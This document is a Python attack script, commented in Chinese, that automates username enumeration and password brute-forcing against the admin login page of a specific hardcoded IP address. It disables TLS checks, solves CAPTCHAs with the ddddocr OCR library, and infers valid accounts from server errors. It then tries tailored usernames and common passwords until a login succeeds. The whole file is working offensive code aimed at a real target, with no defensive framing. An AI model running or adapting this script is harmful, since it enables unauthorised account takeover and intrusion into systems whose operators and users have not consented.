#!/usr/bin/env python3
"""大字典用户名枚举 + 密码爆破"""
import urllib.request, http.cookiejar, ssl, sys, time, json
import ddddocr

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=ctx))
op.addheaders = [("User-Agent","Mozilla/5.0")]
B = "https://101.201.82.174"
ocr = ddddocr.DdddOcr(show_ad=False)

def login_raw(user, pwd, code):
    data = f"username={user}&password={pwd}&verify={code}".encode()
    try:
        r = op.open(urllib.request.Request(f"{B}/customer/admin/dologin.html", data=data), timeout=10)
        return r.read().decode("utf-8","ignore")
    except Exception:
        return "HTTP500"

def get_captcha():
    try:
        r = op.open(f"{B}/customer/admin/verify.html", timeout=10)
        return r.read()
    except Exception:
        return None

def probe(user, pwd="x", max_attempts=10):
    for i in range(max_attempts):
        cap = get_captcha()
        if cap is None:
            time.sleep(1); continue
        try:
            code = ocr.classification(cap)
        except Exception:
            continue
        if len(code) != 4: continue
        r = login_raw(user, pwd, code)
        if "验证码" in r: continue
        if "HTTP500" in r: return "NONE"  # 用户不存在
        return r  # 用户存在
        time.sleep(0.15)
    return "VERIFY_FAIL"

users = []
base = ["admin","zhilian","zyadmin","kefu","zhiliankefu","zy","yun","boss","test",
        "chao","chaoliu","juhe","chaoliujuhe","appschaoliujuhe","sljh","cljh",
        "zhilian_admin","zy_admin","kefu_admin","admin_zy","guanliyuan",
        "zhiliang","zhangliang","liang","wang","zhang","li","liu","chen",
        "yang","zhao","huang","zhou","wu","xu","sun","ma","zhu","hu","guo",
        "he","gao","lin","luo","zheng","liang","xie","song","tang","xu2",
        "kefu01","kefu02","kefu1","kefu2","admin01","admin02","admin1","admin2",
        "zy01","zy02","zhilian01","zhilian02","chao01","liu01","zhang01",
        "wangkefu","zhangKefu","liKefu","cs","customer1","service1","sale",
        "xiaoshou","shouhou","jishu","caiwu","renshi","zongjian","jingli",
        "fuzong","banshi","gongsi","chaoji","liujuhe","super","admin888",
        "zy_kefu01","zy_kefu1","zhilian_kefu","kefuzhongxin","zxkf","kfzx"]

# 生成更多组合
for u in list(base):
    users.append(u)
    users.append(u.upper())
    users.append(u + "123")
    users.append("admin_" + u)
    users.append(u + "_admin")

users = list(dict.fromkeys(users))
print(f"字典: {len(users)} 用户", flush=True)

existing = []
for u in users:
    r = probe(u)
    if r == "NONE":
        continue
    elif r == "VERIFY_FAIL":
        continue
    else:
        print(f"### 存在? {u}: {r[:80]}", flush=True)
        existing.append(u)

print(f"候选: {existing}", flush=True)

passwords = ["123456","admin123","admin","12345678","admin888","123123","admin666",
             "admin@123","123456789","password","111111","888888","a123456",
             "Aa123456","abc123","1234567890","qwerty","1qaz2wsx","admin2024",
             "admin2025","admin2026","test123","yun123","boss123","chao123",
             "juhe123","zhilian123","kefu123","zy123456","zhilian888","kefu888"]

for user in existing:
    print(f"--- 爆破 {user} ---", flush=True)
    for pw in passwords:
        r = probe(user, pw)
        if r == "NONE" or r == "VERIFY_FAIL": continue
        if "密码" in r or "账号" in r or "失败" in r:
            continue
        print(f"!!! 非密码错误: {user}/{pw} -> {r[:100]}", flush=True)
        if '"status":1' in r or "success" in r.lower():
            print(f"!!! 登录成功 {user}/{pw}", flush=True)
            sys.exit(0)
print("DONE")
